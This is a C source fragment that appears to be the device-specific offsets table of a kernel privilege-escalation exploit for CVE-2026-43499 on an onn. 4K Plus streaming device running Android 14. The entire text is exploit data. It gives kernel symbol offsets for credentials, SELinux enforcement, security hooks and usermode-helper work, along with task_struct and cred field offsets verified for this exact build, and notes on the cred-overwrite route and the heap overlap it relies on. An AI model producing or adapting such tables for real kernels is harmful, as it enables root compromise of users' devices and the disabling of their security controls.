/* onn. 4K Plus Streaming ("coffey") - Amlogic s7d
 * Kernel: 5.15.196-android14-11-g3d26c188ef7e-ab14657224
 * ROM:    onn/coffey/coffey:14/URO4.260304.011.B1/15051976
 * Built 2026-01-03, clang 17.0.2 (PGO+BOLT+LTO), Android 14.
 *
 * aarch64 kernel with 32-bit (armeabi-v7a) userspace.
 * Config differs from the 2K stick: CONFIG_ARM64_PTR_AUTH/BTI/CFI_CLANG=y and
 * CONFIG_SCHEDSTATS=y (bigger task_struct, bigger .text).  This kernel is
 * still vulnerable to CVE-2026-43499: remove_waiter clears
 * current->pi_blocked_on (sp_el0) instead of waiter->task->pi_blocked_on.
 *
 * Symbol offsets recovered from boot.img kallsyms (CONFIG_KALLSYMS_ALL),
 * base = link _text = 0xffffffc008000000 (arm64 KASLR is 2MB-rounded, so
 * runtime _text == `min_ip & ~0x1fffff`).
 *
 * Struct offsets verified by disassembly of this exact build:
 *   prepare_creds/commit_creds -> real_cred=0x7f8, cred=0x800
 *   remove_waiter              -> pi_lock=0x8ec, pi_blocked_on=0x918
 *   task_blocks_on_rt_mutex    -> pi_waiters=0x900 (rb_root) / +0x908
 *   rt_mutex_setprio           -> pi_top_task=0x910
 *   sched_move_task            -> sched_task_group=0x340
 *   init_task dump             -> prio=0x7c, normal_prio=0x84
 *   init_cred dump             -> cap_eff=0x38, user=0x80, user_ns=0x88,
 *                                 ucounts=0x90, group_info=0x98
 *   ashmem_fops dump           -> 5.15 file_operations layout
 *   mm_cache_init              -> kmem_cache_create_usercopy("mm_struct",
 *                                 0x3e8 = 1000) -> stride ALIGN(1000,64)=1024
 */

OFFSETS_ENTRY("5.15.196-android14-11-g3d26c188ef7e-ab14657224",
  .kernel_phys_load = 0x1080000, /* Amlogic convention; --cred does not use it */
  .phys_offset = 0x0,
  .kimage_text_base = 0xffffffc008000000ULL,

  .off_init_task          = 0x0289C200ULL,
  .off_init_cred          = 0x0285E4E8ULL,
  .off_init_uts_ns        = 0x028F1590ULL,
  .off_empty_zero_page    = 0x02992000ULL,
  .off_root_task_group    = 0x02997400ULL,
  .off_selinux_enforcing  = 0x029E9078ULL,
  .off_selinux_enforcing_device = 0x029E9078ULL,
  .off_kptr_restrict      = 0x0275DB64ULL,
  .off_selinux_blob_sizes = 0x01B6D8F0ULL,
  .off_security_hook_heads= 0x01B6D218ULL,
  .off_kmalloc_caches     = 0x01B6E478ULL,
  .off_anon_pipe_buf_ops  = 0x019AB4F0ULL,
  .off_ashmem_misc_fops   = 0x028E7AE0ULL, /* ashmem_misc + 0x10 (.fops) */
  .off_ashmem_fops        = 0x01B1C4C0ULL,
  .off_ashmem_ioctl       = 0x01047E70ULL,
  .off_ashmem_compat_ioctl= 0x01048874ULL, /* compat_ashmem_ioctl */
  .off_ashmem_mmap        = 0x010488C8ULL,
  .off_ashmem_open        = 0x01048B78ULL,
  .off_ashmem_release     = 0x01048C10ULL,
  .off_ashmem_show_fdinfo = 0x01048D2CULL,
  .off_configfs_read_iter = 0x0063330CULL,
  .off_configfs_bin_write_iter = 0x00633BBCULL,
  .off_copy_splice_read   = 0,          /* not present in 5.15 */
  .off_noop_llseek        = 0x0050E818ULL,
  .off_cap_capable_active = 0,          /* unused */
  .off_slide_nfulnl_logger= 0x02761A98ULL,
  .off_slide_loggers_0_1  = 0x027619B8ULL,
  .off_slide_boot_id      = 0x02A04931ULL, /* sysctl_bootid */

  .off_system_unbound_wq  = 0x02760448ULL,
  .off_call_usermodehelper_exec_work = 0x0015ED20ULL,

  .off_init_user_ns        = 0x02913ED0ULL,
  .off_init_user_ns_device = 0x02913ED0ULL,

  /* task_struct field offsets (this build) */
  .task_prio = 0x7C,
  .task_normal_prio = 0x84,
  .task_sched_task_group = 0x340,
  .task_pi_lock = 0x8EC,
  .task_pi_waiters = 0x900,
  .task_pi_top_task = 0x910,
  .task_pi_blocked_on = 0x918,
  .task_real_cred = 0x7F8,
  .task_cred = 0x800,
  .task_comm = 0,   /* unused by this code */
  .mm_owner = 0,    /* mm_struct.owner; unused by --cred */
  .waiter_compact = 1,
  .iov_covers_waiter = 1, /* sendmsg iovstack base = waiter-0x28 */
  .mm_struct_sz = 1024, /* ALIGN(0x3e8,64) */

  /* file_operations (5.15 layout; note this kernel has CONFIG_CFI_CLANG so
   * the real table holds .cfi_jt stubs - only affects the fops route) */
  .fops_llseek = 0x08,
  .fops_read = 0x10,
  .fops_write = 0x18,
  .fops_read_iter = 0x20,
  .fops_write_iter = 0x28,
  .fops_open = 0x70,
  .fops_release = 0x80,
  .fops_splice_read = 0xC8,
  .fops_show_fdinfo = 0xE0,
),
